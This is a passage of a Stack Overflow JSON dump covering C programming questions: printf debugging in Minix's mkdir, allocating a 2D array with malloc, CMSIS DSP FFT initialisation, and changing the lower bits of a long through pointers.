<code>mkdir</code>.\nI added this line of code to line 610:</p>\n\n<pre><code>    printf(\"New dir -&gt; %s %o\",fullpath,dirmode);\n</code></pre>\n\n<p>With this edit, <code>mkdir</code> printed correctly, except that if the folder already existed, I was getting the following message:</p>\n\n<pre><code>New Dir -&gt; test 755 mkdir: test: file exists\n</code></pre>\n\n<p>I expected to see:</p>\n\n<pre><code>mkdir: test: file exists\n</code></pre>\n\n<p>I thought that by adding the printf to the last if-else body near line 610, it would not execute in this case, since this if-else structure checks if the new directory is valid (inode, permissions, etc), and the call should return if the directory already exists. I was mistaken.</p>\n\n<p>What system function or variable should I check to see if the file already exists?</p>\n\n<p><a href=\"http://pastie.org/private/kddpryjrojsaqbun1xjrdw\" rel=\"nofollow\">My edited version of open.c.</a></p>\n\n<p>I'm using Minix version 3.2.1.</p>\n\n<p>To test this, I rebuilt just the kernel, like this:</p>\n\n<pre><code>cd /usr/src/releasetools\nmake hdboot\n</code></pre>\n"}, {"tags": ["arrays", "c", "multidimensional-array", "malloc"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 2, "creation_date": 1461762117, "post_id": 36890624, "comment_id": 61345519, "body": "Are you using C or C++?"}, {"owner": {"reputation": 734, "user_id": 3235081, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/iSyXb.png?s=128&g=1", "display_name": "Shady Programmer", "link": "https://stackoverflow.com/users/3235081/shady-programmer"}, "edited": false, "score": 0, "creation_date": 1461762248, "post_id": 36890624, "comment_id": 61345638, "body": "You could write your own function containing everything necessary to do that. Other than that there is no syntax trickery that would make it possible."}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 1, "creation_date": 1461767217, "post_id": 36890624, "comment_id": 61349729, "body": "See also <a href=\"http://stackoverflow.com/questions/36794202/freaky-way-of-allocating-two-dimensional-array/36799070#36799070\">this answer</a>."}], "answers": [{"comments": [{"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 5, "creation_date": 1461762409, "post_id": 36890692, "comment_id": 61345770, "body": "@Olaf Calm down, there is no 2D array you can have with C, the OP want is to allocate once for a buffer to hold NxM ints."}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1461762473, "post_id": 36890692, "comment_id": 61345819, "body": "Plus, it is not at all &quot;obsolete&quot;, it is something you see today. It all depends your use case. It&#39;s odd you can declare some way of code as &quot;obsolete&quot; after all."}, {"owner": {"reputation": 301, "user_id": 6248537, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FmNAE.jpg?s=128&g=1", "display_name": "ninazzo", "link": "https://stackoverflow.com/users/6248537/ninazzo"}, "edited": false, "score": 1, "creation_date": 1461762717, "post_id": 36890692, "comment_id": 61345997, "body": "I just asked if there was a way <b>like</b> that, I never said that <b>that</b> was the way."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1461762923, "post_id": 36890692, "comment_id": 61346178, "body": "@fluter: You very well can! See my answer. And yes, it <i>is</i> obsolete. It is just that there are too many programmers who think there are no multi-dimensional arrays in C. But just beause &quot;we did it that way all the time&quot; does not mean it is the correct way. In fact, there is not a single advantage in your version, but a lot against it, e.g.: error-prone, harder to understand, you have to trace the inner-length yourself."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461763348, "post_id": 36890692, "comment_id": 61346530, "body": "Oh, and sorry, for the hefty reaction. It is just too much confusion about arrays and pointers. And too many programmers in fear of using complex arrays, although it becomes pretty simple once you understood the concept (things get worse with qualifiers, though)."}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461763680, "post_id": 36890692, "comment_id": 61346798, "body": "@Olaf I agree with you that use a pointer to an array is a good one, and I didn&#39;t say the way I used is the only way, it&#39;s just one solution. Again, it&#39;s a pointer to an array, not a 2D array by nature."}, {"owner": {"reputation": 221, "user_id": 1489510, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0defa3de8d0face94931af093718b07e?s=128&d=identicon&r=PG", "display_name": "rfabbri", "link": "https://stackoverflow.com/users/1489510/rfabbri"}, "edited": false, "score": 0, "creation_date": 1556573972, "post_id": 36890692, "comment_id": 98477388, "body": "To recover the ability to use <code>arr[i][j]</code> syntax, folow up with casting to <code>int (*)[M]</code>. Do <code>int (*arr)[M] = int (*)[M] malloc(N*M*sizeof(int))</code>."}], "tags": [], "owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "is_accepted": false, "score": 18, "last_activity_date": 1461762224, "creation_date": 1461762224, "answer_id": 36890692, "question_id": 36890624, "link": "https://stackoverflow.com/questions/36890624/malloc-a-2d-array-in-c/36890692#36890692", "title": "Malloc a 2D array in C", "body": "<p><code>int ** arr = malloc(N*sizeof(int[M]));</code> is simply incorrect C code, if you simulate it by allocating once like this:</p>\n\n<pre><code>int *arr = malloc(N*M*sizeof(int));\n</code></pre>\n\n<p>Add access it by <code>arr[i*M + j]</code>, this is analog to access <code>arr[I][j]</code> in your first case.</p>\n"}, {"comments": [{"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 2, "creation_date": 1461766792, "post_id": 36890904, "comment_id": 61349352, "body": "Even better - <code>int (*arr)[M] = malloc( sizeof *arr * N );</code>.  This way you don&#39;t have to modify the <code>sizeof</code> expression if the type of <code>arr</code> ever changes."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "reply_to_user": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 0, "creation_date": 1461767626, "post_id": 36890904, "comment_id": 61350075, "body": "@JohnBode see <a href=\"http://stackoverflow.com/a/32985668/971127\">this answer</a>"}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 0, "creation_date": 1461774115, "post_id": 36890904, "comment_id": 61355193, "body": "Obviously that&#39;s only an issue if <code>M</code> isn&#39;t a compile time constant.  And even if it is, &quot;evaluate&quot; doesn&#39;t have to be synonymous with &quot;dereference&quot;.  All that needs to be &quot;evaluated&quot; is the <i>type</i> of the expression <code>*arr</code>; there&#39;s no logical reason that <code>sizeof</code> would ever need to <i>dereference</i> <code>arr</code> to determine its type.  Yes, if you want to be strictly pendantic (and who among us doesn&#39;t), the behavior is undefined, but only because the definition of &quot;evaluate&quot; is imprecise."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "reply_to_user": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 1, "creation_date": 1461774421, "post_id": 36890904, "comment_id": 61355415, "body": "@JohnBode In that post I am a similar opinion with you. However, it should be avoided because it does not find no guarantee of such operations in the standard."}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 3, "creation_date": 1461774953, "post_id": 36890904, "comment_id": 61355769, "body": "And then there&#39;s this language from 5.1.2.3/4: &quot;In the abstract machine, all expressions are evaluated as specified by the semantics. <b>An actual implementation need not evaluate part of an expression if it can deduce that its value is not used and that no needed side effects are produced</b> (including any caused by calling a function or accessing a volatile object).&quot;  I think this gives us an out for using <code>sizeof</code> on a pointer to a VLA."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "reply_to_user": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 0, "creation_date": 1461775466, "post_id": 36890904, "comment_id": 61356076, "body": "@JohnBode I think that very has been matched to our claim (and behavior of gcc). I will remember this. Do you can try to point out to that answer and the post?"}, {"owner": {"reputation": 177, "user_id": 6455667, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh5.googleusercontent.com/-1JxPIUTo54w/AAAAAAAAAAI/AAAAAAAAAbk/ZEp5-K4d0JI/photo.jpg?sz=128", "display_name": "Anchith Acharya", "link": "https://stackoverflow.com/users/6455667/anchith-acharya"}, "edited": false, "score": 1, "creation_date": 1585395701, "post_id": 36890904, "comment_id": 107746664, "body": "@BLUEPIXY So this doesn&#39;t work when M is a variable?"}], "tags": [], "owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "is_accepted": true, "score": 18, "last_activity_date": 1461762824, "creation_date": 1461762824, "answer_id": 36890904, "question_id": 36890624, "link": "https://stackoverflow.com/questions/36890624/malloc-a-2d-array-in-c/36890904#36890904", "title": "Malloc a 2D array in C", "body": "<p>like this : <code>int (*arr)[M] = malloc(sizeof(int[N][M]));</code></p>\n\n<p><code>arr</code> is pointer to <code>int[M]</code>.</p>\n\n<p>use like <code>arr[0][M-1];</code></p>\n\n<p>and <code>free(arr);</code></p>\n"}, {"comments": [{"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1461849394, "post_id": 36890924, "comment_id": 61393702, "body": "I&#39;d be curious to know what the downvoter&#39;s objection was."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 1, "creation_date": 1461849589, "post_id": 36890924, "comment_id": 61393898, "body": "@MichaelPetch: Me too. But you cannot argue with &lt;(well, you might have an idea what I would write here)&gt;."}, {"owner": {"reputation": 221, "user_id": 1489510, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0defa3de8d0face94931af093718b07e?s=128&d=identicon&r=PG", "display_name": "rfabbri", "link": "https://stackoverflow.com/users/1489510/rfabbri"}, "edited": false, "score": 0, "creation_date": 1556573749, "post_id": 36890924, "comment_id": 98477321, "body": "<code>array = int (*)[COLS] malloc(ROWS*COLS*sizeof(int))</code> <i>may</i> be more intutive"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 221, "user_id": 1489510, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0defa3de8d0face94931af093718b07e?s=128&d=identicon&r=PG", "display_name": "rfabbri", "link": "https://stackoverflow.com/users/1489510/rfabbri"}, "edited": false, "score": 0, "creation_date": 1615047617, "post_id": 36890924, "comment_id": 117573368, "body": "@rfabbri That&#39;s less intuitive than the second variant I propose. Additionally the first proposed version also guarantees the inner index to be always consistent to the pointer type. This is not true for the second and your variant. Finally: never typecast &#180;void *&#180; in C! This is one of the stupidities of some coding styles. Please note, this is different in C++, but that&#39;s a different language not subject here."}], "tags": [], "owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "is_accepted": false, "score": 6, "last_activity_date": 1461764061, "last_edit_date": 1461764061, "creation_date": 1461762881, "answer_id": 36890924, "question_id": 36890624, "link": "https://stackoverflow.com/questions/36890624/malloc-a-2d-array-in-c/36890924#36890924", "title": "Malloc a 2D array in C", "body": "<p>You have a \"pointer to pointer\". That cannot represent a 2D array.</p>\n\n<p>The correct declaration of a pointer to a 2D array is</p>\n\n<pre><code>// number of elements in one row\n#define COLS 10\n\n// number of rows\n#define ROWS 20\n\nint (*array)[COLS];   // mind the parenthesis!\n</code></pre>\n\n<p>That makes <code>array</code> a <em>pointer to array of <code>COLS</code> <code>int</code>s</em>. The type is `int (*)[COLS], btw. but you don't need the type, see below.</p>\n\n<p>To allocate the array you should then use the standard allocation for a 1D array:</p>\n\n<pre><code>array = malloc(sizeof(*array) * ROWS);   // COLS is in the `sizeof`\n\narray = malloc(sizeof(int[ROWS][COLS])); // explicit 2D array notation\n</code></pre>\n\n<p>Which variant to use is personal style. While the first contains no redundancy (consider you change the declaration of <code>array</code> to use <code>INNER</code> instead of <code>COLS</code> or the element-type to <code>float</code>). The second is more clear at a fist glance, but more prone to errors when modifying the declaration of <code>array</code>.</p>\n\n<p>To <code>free</code>:</p>\n\n<pre><code>free(array);\n</code></pre>\n"}], "owner": {"reputation": 301, "user_id": 6248537, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FmNAE.jpg?s=128&g=1", "display_name": "ninazzo", "link": "https://stackoverflow.com/users/6248537/ninazzo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35067, "favorite_count": 5, "closed_date": 1461763839, "accepted_answer_id": 36890904, "answer_count": 3, "score": 7, "last_activity_date": 1605954490, "creation_date": 1461762062, "last_edit_date": 1605954427, "question_id": 36890624, "link": "https://stackoverflow.com/questions/36890624/malloc-a-2d-array-in-c", "closed_reason": "Duplicate", "title": "Malloc a 2D array in C", "body": "<p>Every time I allocate the memory for a 2D array first I create an array of <code>int**</code> and then with a for I allocate the memory for each element.</p>\n\n<p>For example:</p>\n\n<pre><code>int ** arr = malloc(N*sizeof(int *));\nfor(i=0; i&lt; N; i++) arr[i] = malloc(M*sizeof(int));\n</code></pre>\n\n<p>Wouldn't be possible allocate the memory like:</p>\n\n<pre><code>int ** arr = malloc(N*sizeof(int[M]));\n</code></pre>\n\n<p>or</p>\n\n<pre><code>int ** arr = malloc(sizeof(int[N][M]));\n</code></pre>\n\n<p>in order to avoid the <code>for</code>?</p>\n"}, {"tags": ["c", "arm", "signal-processing", "cortex-m", "cmsis"], "comments": [{"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461761562, "post_id": 36890313, "comment_id": 61345071, "body": "@Olaf how is that related to the OP&#39;s problem?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "edited": false, "score": 0, "creation_date": 1461762238, "post_id": 36890313, "comment_id": 61345630, "body": "@fluter: Point taken. No Idea why I read the last line as an initialiser for a <code>struct</code>. Maybe I need new glasses."}], "answers": [{"comments": [{"owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "edited": false, "score": 0, "creation_date": 1461762940, "post_id": 36890598, "comment_id": 61346195, "body": "Yes, the function is declared like that now. In 2012, the function took 5 arguments, the second was this pointer to th cfft thing. Reasoning was, the fft for real inputs was using the fft for complex inputs internally with some clever reorganization of data. The rfft_init function was initializing both structures. Since the current library&#39;s rfft structure still has a cfft pointer member (the last member), I wonder how this cfft is allocated. After all, on cortex m, the library cannot simply call malloc."}], "tags": [], "owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "is_accepted": false, "score": 2, "last_activity_date": 1461761996, "creation_date": 1461761996, "answer_id": 36890598, "question_id": 36890313, "link": "https://stackoverflow.com/questions/36890313/arm-rfft-init-q31-how-is-the-cfft-member-initialized/36890598#36890598", "title": "arm_rfft_init_q31: how is the cfft member initialized?", "body": "<p>The function is declared as</p>\n\n<pre><code>arm_status  arm_rfft_init_q31 (arm_rfft_instance_q31 *S, uint32_t fftLenReal, uint32_t ifftFlagR, uint32_t bitReverseFlag);\n</code></pre>\n\n<p>It expect an <code>uint32_t</code> as the second argument, while you are passing a pointer to a <code>arm_cfft_radix4_instance_q31</code>. Also, according to the name, what you want is just:</p>\n\n<pre><code>uint32_t fftlen=128;\narm_rfft_instance_q31 forward_rfft_instance = {0};\narm_rfft_init_q31(&amp;forward_rfft_instance, fftlen, 0, 1);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "is_accepted": true, "score": 0, "last_activity_date": 1461764309, "creation_date": 1461764309, "answer_id": 36891534, "question_id": 36890313, "link": "https://stackoverflow.com/questions/36890313/arm-rfft-init-q31-how-is-the-cfft-member-initialized/36891534#36891534", "title": "arm_rfft_init_q31: how is the cfft member initialized?", "body": "<p>Looking at the source (I did not know it was available) I find that the initialization function inserts a pointer to a global constant cfft struct that is apparently linked into the binary as needed.</p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 4430803, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-LlmrMjw965I/AAAAAAAAAAI/AAAAAAAAOh0/U3_tgRzmUiY/photo.jpg?sz=128", "display_name": "Greg Bodnar", "link": "https://stackoverflow.com/users/4430803/greg-bodnar"}, "is_accepted": false, "score": 0, "last_activity_date": 1486082002, "creation_date": 1486082002, "answer_id": 42014850, "question_id": 36890313, "link": "https://stackoverflow.com/questions/36890313/arm-rfft-init-q31-how-is-the-cfft-member-initialized/42014850#42014850", "title": "arm_rfft_init_q31: how is the cfft member initialized?", "body": "<p>I had seen code on github for CMSIS 5, but I can't find it now. It confirmed what you'd seen about global constant cfft structs being available in the math library.</p>\n\n<p>Use nm to look at the library, libarm_cortexM4lf_math.a in my case:</p>\n\n<pre><code>nm libarm_cortexM4lf_math.a\n</code></pre>\n\n<p>This provides a list of read-only structs that are referenced in the arm_rfft_init_q31 call.</p>\n\n<pre><code>arm_const_structs.o:\n00000000 R arm_cfft_sR_f32_len1024\n00000000 R arm_cfft_sR_f32_len128\n00000000 R arm_cfft_sR_f32_len16\n00000000 R arm_cfft_sR_f32_len2048\n00000000 R arm_cfft_sR_f32_len256\n00000000 R arm_cfft_sR_f32_len32\n00000000 R arm_cfft_sR_f32_len4096\n00000000 R arm_cfft_sR_f32_len512\n00000000 R arm_cfft_sR_f32_len64\n00000000 R arm_cfft_sR_q15_len1024\n00000000 R arm_cfft_sR_q15_len128\n00000000 R arm_cfft_sR_q15_len16\n00000000 R arm_cfft_sR_q15_len2048\n00000000 R arm_cfft_sR_q15_len256\n00000000 R arm_cfft_sR_q15_len32\n00000000 R arm_cfft_sR_q15_len4096\n00000000 R arm_cfft_sR_q15_len512\n00000000 R arm_cfft_sR_q15_len64\n00000000 R arm_cfft_sR_q31_len1024\n00000000 R arm_cfft_sR_q31_len128\n00000000 R arm_cfft_sR_q31_len16\n00000000 R arm_cfft_sR_q31_len2048\n00000000 R arm_cfft_sR_q31_len256\n00000000 R arm_cfft_sR_q31_len32\n00000000 R arm_cfft_sR_q31_len4096\n00000000 R arm_cfft_sR_q31_len512\n00000000 R arm_cfft_sR_q31_len64\n</code></pre>\n\n<p>And the q31 initialisation, for example:</p>\n\n<pre><code>arm_rfft_init_q31.o:\n         U arm_cfft_sR_q31_len1024\n         U arm_cfft_sR_q31_len128\n         U arm_cfft_sR_q31_len16\n         U arm_cfft_sR_q31_len2048\n         U arm_cfft_sR_q31_len256\n         U arm_cfft_sR_q31_len32\n         U arm_cfft_sR_q31_len4096\n         U arm_cfft_sR_q31_len512\n         U arm_cfft_sR_q31_len64\n00000001 T arm_rfft_init_q31\n000000e4 t $d\n00000000 r $d\n00000000 r $d\n00000010 N $d\n00000000 r realCoefAQ31\n00000000 r realCoefBQ31\n00000000 t $t\n</code></pre>\n\n<p>Instead of using the init functions for Real FFTs, the instance structure can be defined directly referencing the cfft structs above as well as the twiddle factor pointers, as indicated in the <a href=\"https://www.keil.com/pack/doc/CMSIS/DSP/html/group__Fast.html\" rel=\"nofollow noreferrer\">CMSIS documentation</a>.</p>\n"}], "owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 443, "favorite_count": 0, "accepted_answer_id": 36891534, "answer_count": 3, "score": 0, "last_activity_date": 1486082002, "creation_date": 1461761306, "question_id": 36890313, "link": "https://stackoverflow.com/questions/36890313/arm-rfft-init-q31-how-is-the-cfft-member-initialized", "title": "arm_rfft_init_q31: how is the cfft member initialized?", "body": "<p>Trying to use some old code with a current CMSIS DSP library. Old code:</p>\n\n<pre><code>const unsiged fftlen=128;\narm_cfft_radix4_instance_q31 forward_cfft_instance = {0};\narm_rfft_instance_q31 forward_rfft_instance = {0};\narm_rfft_init_q31(&amp;forward_rfft_instance, &amp;forward_cfft_instance,fftlen, 0, 1);\n</code></pre>\n\n<p>The compiler tells me that the function arm_rfft_init_q31 does not accept my 2nd parameter, <code>(_cfft_)</code>, anymore, in the current version of the DSP lib. </p>\n\n<p>Since the rfft struct still has a pointer to a cfft instance, I wonder how this pointer is initialized these days?</p>\n\n<p>I tried to find a relevant changelog entry that explains this to me, so far without luck.</p>\n"}, {"tags": ["c", "pointers", "bit", "bitwise-and"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1461760967, "post_id": 36890101, "comment_id": 61344586, "body": "Your question is very confused. What do you want and how is that related to pointers? See <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 7645, "user_id": 2692339, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4f8e4e5cba3b6606d8e395364c1742b8?s=128&d=identicon&r=PG&f=1", "display_name": "edmz", "link": "https://stackoverflow.com/users/2692339/edmz"}, "edited": false, "score": 0, "creation_date": 1461761387, "post_id": 36890101, "comment_id": 61344942, "body": "If I understood it correctly, you want to change the lower <code>int</code> part of a <code>long</code> through pointers; no, this is not possible. It breaks the strict-aliasing rule."}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 3206674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8de1b655160c799a72064a60da72a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "dev.burak", "link": "https://stackoverflow.com/users/3206674/dev-burak"}, "edited": false, "score": 0, "creation_date": 1461761222, "post_id": 36890197, "comment_id": 61344795, "body": "yeah but I need change lower and change value of lower"}, {"owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "reply_to_user": {"reputation": 3, "user_id": 3206674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8de1b655160c799a72064a60da72a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "dev.burak", "link": "https://stackoverflow.com/users/3206674/dev-burak"}, "edited": false, "score": 0, "creation_date": 1461761390, "post_id": 36890197, "comment_id": 61344945, "body": "@dev.burak to change the lower part again use bitwise and and or."}], "tags": [], "owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "is_accepted": false, "score": 3, "last_activity_date": 1461761362, "last_edit_date": 1461761362, "creation_date": 1461761010, "answer_id": 36890197, "question_id": 36890101, "link": 